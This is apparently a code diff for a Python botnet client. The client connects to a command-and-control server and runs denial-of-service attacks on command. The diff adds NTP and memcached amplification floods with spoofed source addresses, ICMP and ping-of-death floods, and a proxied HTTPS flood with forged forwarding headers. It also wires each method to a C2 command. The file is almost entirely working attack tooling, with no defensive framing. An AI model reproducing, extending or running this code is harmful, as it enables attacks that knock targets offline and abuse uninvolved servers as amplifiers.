@@ -1,20 +1,157 @@
-import socket, threading, time, random, cloudscraper, requests, struct, fake_useragent, os
+import socket, threading, time, random, cloudscraper, requests, struct, os, sys, socks, ssl
 from multiprocessing import Process
+from urllib.parse import urlparse
+from scapy.all import IP, UDP, Raw, ICMP, send
+from scapy.layers.inet import IP
+from scapy.layers.inet import TCP
+from icmplib import ping as pig
+from scapy.layers.inet import UDP
     
-# IP and PORT C2
-C2_ADDRESS  = "localhost"
-C2_PORT     = 5511
+# IP AND PORT C2 ------------------->
+KRYPTONC2_ADDRESS  = "localhost"
+KRYPTONC2_PORT     = 5511
 
+
+# Code -------------------------->
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
     'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
     'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
     'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
 ]
 
 def rand_ua():
-    return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
+    chosen_user_agent = random.choice(base_user_agents)
+    return chosen_user_agent.format(
+        random.random() + 5,
+        random.random() + random.randint(1, 8),
+        random.random(),
+        random.randint(2000, 2100),
+        random.randint(92215, 99999),
+        random.random() + random.randint(3, 9)
+    )
+
+# NEW METHODS ----------------->
+ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
+def NTP(target, port, timer):
+    try:
+        with open("ntpServers.txt", "r") as f:
+            ntp_servers = f.readlines()
+        packets = random.randint(10, 150)
+    except Exception as e:
+        print(f"Erro: {e}")
+        pass
+
+    server = random.choice(ntp_servers).strip()
+    while time.time() < timer:
+        try:
+            packet = (
+                    IP(dst=server, src=target)
+                    / UDP(sport=random.randint(1, 65535), dport=int(port))
+                    / Raw(load=ntp_payload)
+            )
+            try:
+                for _ in range(50000000):
+                    send(packet, count=packets, verbose=False)
+                    print('PKT SEND')
+            except Exception as e:
+               # print(f"Erro: {e}")
+                pass
+        except Exception as e:
+            #print(f"Erro: {e}")
+            pass
+
+mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
+def MEM(target, port, timer):
+    packets = random.randint(1024, 60000)
+    try:
+        with open("memsv.txt", "r") as f:
+            memsv = f.readlines()
+    except:
+        #print('Erro')
+        pass
+    server = random.choice(memsv).strip()
+    while time.time() < timer:
+        try:
+            try:
+                packet = (
+                        IP(dst=server, src=target)
+                        / UDP(sport=port, dport=11211)
+                        / Raw(load=mem_payload)
+                )
+                for _ in range(5000000):
+                    send(packet, count=packets, verbose=False)
+            except:
+                pass
+        except:
+            pass
+
+def icmp(target, timer):
+    while time.time() < timer:
+        try:
+            for _ in range(5000000):
+                packet = random._urandom(int(random.randint(1024, 60000)))
+                pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
+        except:
+            pass
+
+def pod(target, timer):
+    while time.time() < timer:
+        try:
+            rand_addr = spoofer()
+            ip_hdr = IP(src=rand_addr, dst=target)
+            packet = ip_hdr / ICMP() / ("m" * 60000)
+            send(packet)
+        except:
+            pass
+
+
+# old methods --------------------->
+def spoofer():
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
+    return assemebled
+
+def httpSpoofAttack(url, timer):
+    timeout = time.time() + int(timer)
+    proxies = open("socks4.txt").readlines()
+    proxy = random.choice(proxies).strip().split(":")
+    req =  "GET "+"/"+" HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "X-Forwarded-Proto: Http\r\n"
+    req += "X-Forwarded-Host: "+urlparse(url).netloc+", 1.1.1.1\r\n"
+    req += "Via: "+spoofer()+"\r\n"
+    req += "Client-IP: "+spoofer()+"\r\n"
+    req += "X-Forwarded-For: "+spoofer()+"\r\n"
+    req += "Real-IP: "+spoofer()+"\r\n"
+    req += "Connection: Keep-Alive\r\n\r\n"
+    while time.time() < timeout:
+        try:
+            s = socks.socksocket()
+            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            s.connect((str(urlparse(url).netloc), int(443)))
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            try:
+                for i in range(5000000000):
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            s.close()
+
+
+# Functions ------------------------>
 
 def remove_by_value(arr, val):
     return [item for item in arr if item != val]
@@ -77,7 +214,7 @@ def thread(target, proxies, cfbp):
         run(target, proxies, cfbp)
         time.sleep(1)
 
-def iostresser(target, times, threads, attack_type):
+def httpio(target, times, threads, attack_type):
     proxies = []
     if attack_type == 'PROXY' or attack_type == 'proxy':
         cfbp = 0
@@ -240,7 +377,7 @@ def main():
         c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
         while 1:
             try:
-                c2.connect((C2_ADDRESS, C2_PORT))
+                c2.connect((KRYPTONC2_ADDRESS, KRYPTONC2_PORT))
                 while 1:
                     c2.send('669787761736865726500'.encode())
                     break
@@ -286,6 +423,44 @@ def main():
 
                     for _ in range(threads):
                         threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
+
+                elif command == '.NTP':
+                    ip = args[1]
+                    port = int(args[2])
+                    timer = time.time() + int(args[3])
+                    threads = int(args[4])
+                    #event = threading.Event()
+
+                    for _ in range(threads):
+                        threading.Thread(target=NTP, args=(ip, port, timer), daemon=True).start()
+
+                elif command == '.MEM':
+                    ip = args[1]
+                    port = int(args[2])
+                    timer = time.time() + int(args[3])
+                    threads = int(args[4])
+                    #event = threading.Event()
+
+                    for _ in range(threads):
+                        threading.Thread(target=MEM, args=(ip, port, timer), daemon=True).start()
+
+                elif command == '.ICMP':
+                    ip = args[1]
+                    timer = time.time() + int(args[2])
+                    threads = int(args[3])
+                    #event = threading.Event()
+
+                    for _ in range(threads):
+                        threading.Thread(target=icmp, args=(ip, timer), daemon=True).start()
+
+                elif command == '.POD':
+                    ip = args[1]
+                    timer = time.time() + int(args[2])
+                    threads = int(args[3])
+                    #event = threading.Event()
+
+                    for _ in range(threads):
+                        threading.Thread(target=pod, args=(ip, timer), daemon=True).start()
 
                 elif command == '.TUP':
                     ip = args[1]
@@ -370,14 +545,22 @@ def main():
                     for _ in range(threads):
                         threading.Thread(target=CFB, args=(url,port,secs), daemon=True).start()
 
-                elif command == ".IOSTRESSER":
+                elif command == ".HTTPIO":
                     url = args[1]
                     secs = int(args[2])
                     threads = int(args[3])
                     attackType = args[4]
                     #threads = int(args[5])
                     
-                    threading.Thread(target=iostresser, args=(url, secs, threads, attackType), daemon=True).start()
+                    threading.Thread(target=httpio, args=(url, secs, threads, attackType), daemon=True).start()
+
+                elif command == ".HTTPSPOOF":
+                    url = args[1]
+                    timer = time.time() + int(args[2])
+                    threads = int(args[3])
+                    
+                    for _ in range(threads):
+                        threading.Thread(target=httpSpoofAttack, args=(url, timer), daemon=True).start()
                 
                 elif command == 'PING':
                     c2.send('PONG'.encode())
